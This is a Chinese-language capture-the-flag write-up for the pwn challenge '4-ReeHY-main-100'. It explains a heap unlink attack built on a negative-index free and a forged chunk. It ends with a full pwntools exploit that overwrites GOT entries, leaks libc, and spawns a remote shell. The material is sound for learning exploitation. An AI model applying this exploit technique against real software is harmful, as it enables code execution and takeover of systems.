# 4-ReeHY-main-100
使用的是double free的unlink漏洞

unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并。

Unsorted bin使用双向链表维护被释放的空间，如果有一个堆块准备释放，它的物理相邻地址处如果有空闲堆块，并且空闲堆块不是TOP块，则会与相邻的堆块合并，即unlink后。相当于从双向链表里删除P，这里的关键就是

FD->bk = BK

BK->fd = FD


```c
__int64 sub_400B21()
{
  __int64 result; // rax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Chose one to dele");
  result = sub_400C55();
  v1 = result;
  if ( (int)result <= 4 )
  {
    free(*((void **)&unk_6020E0 + 2 * (int)result));
    dword_6020E8[4 * v1] = 0;
    puts("dele success!");
    return (unsigned int)--dword_6020AC;
  }
  return result;
}
```
这个程序的delete功能没有检查下标为负数的情况

```c
.bss:00000000006020E0 unk_6020E0      db    ? ;               ; DATA XREF: sub_4009D1+FE↑o
.bss:00000000006020E0                                         ; sub_400B21+33↑o ...
.bss:00000000006020E1                 db    ? ;
.bss:00000000006020E2                 db    ? ;
.bss:00000000006020E3                 db    ? ;
.bss:00000000006020E4                 db    ? ;
.bss:00000000006020E5                 db    ? ;
.bss:00000000006020E6                 db    ? ;
.bss:00000000006020E7                 db    ? ;
.bss:00000000006020E8 ; _DWORD dword_6020E8[18]
.bss:00000000006020E8 dword_6020E8    dd 12h dup(?)           ; DATA XREF: sub_4009D1+119↑o
```

经过调试，当我们delete(-2)时，释放的正好是0x6020C0处元素指向的堆(保存4个堆大小的堆)

```c
; Attributes: bp-based frame

; int sub_400856()
sub_400856 proc near

buf= qword ptr -8

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     rax, cs:stdout
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
mov     rax, cs:stdin
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
mov     rax, cs:stderr
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
mov     edi, 14h        ; size
call    _malloc
mov     cs:qword_6020C0, rax
lea     rdi, s          ; "Input your name: "
call    _puts
mov     edx, 2          ; n
lea     rsi, asc_400DDA ; "$ "
mov     edi, 1          ; fd
mov     eax, 0
call    _write
mov     edi, 20h ; ' '  ; size
call    _malloc
mov     [rbp+buf], rax
mov     rax, [rbp+buf]
mov     edx, 20h ; ' '  ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
mov     eax, 0
call    _read
mov     edx, 6          ; n
lea     rsi, aHello     ; "Hello "
mov     edi, 1          ; fd
mov     eax, 0
call    _write
mov     rax, [rbp+buf]
mov     rdi, rax        ; s
call    _puts
nop
leave
retn
; } // starts at 400856
sub_400856 endp
```

其中
```c
mov     edi, 14h        ; size
call    _malloc
mov     cs:qword_6020C0, rax
```
它的大小为0x14，释放后归于fastbin
当再次malloc(0x14)申请时，便会返回这个释放后的堆的地址(fastbin的特性，使用单向链表维护释放后的块，再次申请时最先返回最后放入的那个块，类似于栈)，于是编辑申请的这个堆，就是编辑保存4个堆大小的堆，这个大小信息在 编辑功能时会用到，我们要先溢出堆，就需要修改大小限制

我们edit申请的这个堆，构造payload，修改第一个堆的大小信息为0x200，这样我们在edit第一个堆时，就能溢出了

那么接下来，就是构造假的堆，来触发unlink了。

Chunk1的prev_size和size也是关键
```
#define prev_chunk(p) ((mchunkptr)( ((char*)(p)) - ((p)->prev_size) ))  
```
Chunk1的地址减去prev_size就是chunk0,还有就是size的最后1个bit为0，代表前一个块chunk0处于空闲状态

实际上，真正的chunk0是chunk1-0x110，因为chunk0也有prev_size和size字段，我们这里构造假的空闲chunk0’，并且chunk1的prev_size为0x100，让系统误以为chunk0是在chunk1-0x100处开始的，这就骗过了系统。

至于那个假的chunk的fd和bk，它的值关键，既要绕过检测，也要达到我们的目的。这里有一个公式，假如，被unlink的块P指针的地址为Paddr，那么设置fd=Paddr – 0x18，设置bk = Paddr – 0x10，根据chunk的数据结构可以很容易推出，最终导致P的指针指向了Paddr – 0x18

那么接下来，我们就可以修改数组里保存的4个堆指针了，让它们指向一些关键的地方。

然后再分别edit(0,xx),edit(1,xxx),edit(2,xxx),edit(3,xxxx)，修改关键地方的数据。比如修改got表。最终getshell。

exp:
```python
from pwn import *  
from LibcSearcher import *  
  
context.log_level = 'debug'  
#sh = process('./4-ReeHY-main')  
#elf = ELF('./4-ReeHY-main')  
#libc = ELF('/ctflibc.so.6')  
  
sh = remote("61.147.171.105",65363)  
  
def welcome():  
   sh.sendlineafter('$','seaase')  
  
def create(size,index,content):  
   sh.sendlineafter('$','1')  
   sh.sendlineafter('Input size\n',str(size))  
   sh.sendlineafter('Input cun\n',str(index))  
   sh.sendafter('Input content\n',content)  
  
def delete(index):  
   sh.sendlineafter('$','2')  
   sh.sendlineafter('Chose one to dele\n',str(index))  
  
def edit(index,content):  
   sh.sendlineafter('$','3')  
   sh.sendlineafter('Chose one to edit\n',str(index))  
   sh.sendafter('Input the content\n',content)  
  
#处理开始  
welcome()  
#先创建两个0x100的堆(不要太大，也不要太小,这样使用unsorted bin)  
create(0x100,0,b'a'*0x100)  
create(0x100,1,b'b'*0x100)  
  
#delete功能没有检查下标越界,delete(-2)就是释放记录4个cun大小的那个堆空间  
delete(-2)  
  
payload = p32(0x200) + p32(0x100)  
#根据堆fastbin的特性，新申请的空间位于刚刚释放的那个小内存处,将覆盖原来的那个内容，相当于qword_6020C0[0] = 0x200，  
#这样功能3 read的时候就可以溢出堆(本来只读取那么多，现在可以多读取0x100字节)  
create(0x14,2,payload)  
  
#现在我们要在第一个堆里构造一个假的堆结构了  
# prev_size        size 末尾的1标志前一个块不空闲  
payload = p64(0) + p64(0x101)  
# FD 和 BK分别是后一个块的指针和前一个块的指针,构成双向链表  
# if (__builtin_expect (FD->bk != P || BK->fd != P, 0))  
#  malloc_printerr (check_action, "corrupted double-linked list", P);  
#为了绕过验证，首先  
# FD = *(P + size + 0x10)  
# BK = *(P - Prev_Size + 0x18)  
# FD->bk = *(P + size + 0x10) - FD->Prev_Size + 0X18  
# BK->fd = *(P - Prev_Size + 0x18) + BK->size + 0x10  
# 上面即检测双向链表的完整性  
# 如果通过  
# unlink里的关键代码  
#   FD->bk = BK;  
#   BK->fd = FD;  
# 我们现在的目的是，利用这两个指针修改的操作，来修改我们想要的位置  
# 这个程序中，在0x6020E0是一个数组，用来保存着4个堆的指针  
# 如果我们想办法把这些堆指针改成某些函数的got表地址，那么我们下次read时，数据就会覆盖got表  
# 因此,如果 (P + size + 0x10) = 0x6020E0 ，(P - Prev_Size + 0x18) = 0x6020E0  
# 即P + size = 0x6020D0，P - Prev_Size = 0x6020C8  
# 即BK = 0x6020D0 ，FD = 0x6020C8  
# 即P->fd = 0x6020C8，P->bk = 0x6020D0  
# 现在，主角是P，我们让第一个堆为主角  
payload += p64(0x6020C8) + p64(0x6020D0)  
#填充满第一个块  
payload += b'a'*(0x100-4*8);  
#溢出到第二个块  
# prev_size   size  
# 对于使用中的块，它的结构是这样的  
# prev_size 8 byte  
# size 8 byte  
#修改第二个块的Prev_Size，造成前一个块被释放的假象  
payload += p64(0x100) + p64(0x100 + 2 * 8)  
#发送payload，修改堆结构  
edit(0,payload)  
#现在我们调用delete(1)释放第二个块，它会和我们伪造的块进行unlink合并  
#  
#   执行  
#   FD->bk = BK;  
#   BK->fd = FD;  
#  
#   即*(0x6020C8+0x18) = 0x6020D0  
#     *(0x6020D0 + 0x10) = 0x6020C8  
#   最终即0x6020E0 = 0x6020C8  
#  这样，由于0x6020E0处是用于保存第1个堆指针的，现在被我们指向了0x6020C8处，于是我们向第1个堆输入数据都会存于这里  
#触发unlink  
delete(1)  
  
elf = ELF('./4-ReeHY-main')  
free_got = elf.got['free']  
puts_got = elf.got['puts']  
atoi_got = elf.got['atoi']  
puts_plt = elf.plt['puts']  
#于是，我们可以根据结构，布局payload来覆盖0x6020E04处的几个堆的指针  
payload = b'\x00'*0x18   #padding  
payload += p64(free_got) + p64(1)  
payload += p64(puts_got) + p64(1)  
payload += p64(atoi_got) + p64(1)  
  
#执行后，前3个堆指针都被我们指向了几个函数的got地址处  
edit(0,payload)  
#修改free的got地址为puts的plt地址  
edit(0,p64(puts_plt))  
#即调用puts_plt(puts_got)，泄露puts的加载地址  
delete(1)  
puts_addr = u64(sh.recv(6).ljust(8,b'\x00'))  
  
print (hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)  
  
libc_base = puts_addr - libc.dump('puts')  
system_addr = libc_base + libc.dump('system');  
#修改atoi的got地址为system的got地址  
edit(2,p64(system_addr))  
  
#get shell  
sh.sendlineafter('$','/bin/sh')  
  
sh.interactive()  
```